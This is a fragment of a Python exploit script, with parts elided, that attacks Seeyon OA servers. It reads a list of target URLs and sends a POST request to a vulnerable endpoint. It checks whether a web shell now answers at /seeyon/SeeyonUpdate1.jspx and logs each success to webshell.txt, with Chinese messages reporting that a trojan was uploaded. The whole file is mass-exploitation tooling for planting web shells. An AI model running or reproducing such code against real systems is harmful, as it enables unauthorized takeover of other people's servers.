...
def POC_1(target_url):
    ...
    response = requests.post(url=vuln_url_1, headers=headers, data=data, verify=False)
    ...
    try:
        ...
        if response.status_code == 200:
            with open('webshell.txt', 'a', encoding='utf8') as vu:
                vu.write("目标 {} 被上传木马: {}/seeyon/SeeyonUpdate1.jspx\n".format(target_url, target_url))
                print("\033[31m[x] 目标 {} 被上传木马: {}/seeyon/SeeyonUpdate1.jspx \033[0m".format(target_url, target_url))
    ...
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            webshell_url = url + "/seeyon/SeeyonUpdate1.jspx"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            }
            try:
                ...
                if response.status_code == 200:
                    with open('webshell.txt', 'a', encoding='utf8') as vu:
                        vu.write("目标 {} 被上传木马: {}/seeyon/SeeyonUpdate1.jspx\n".format(url, url))
                        print("\033[31m[x] 目标 {} 被上传木马: {}/seeyon/SeeyonUpdate1.jspx \033[0m".format(url, url))
                    continue
                else:
                    POC_1(url)
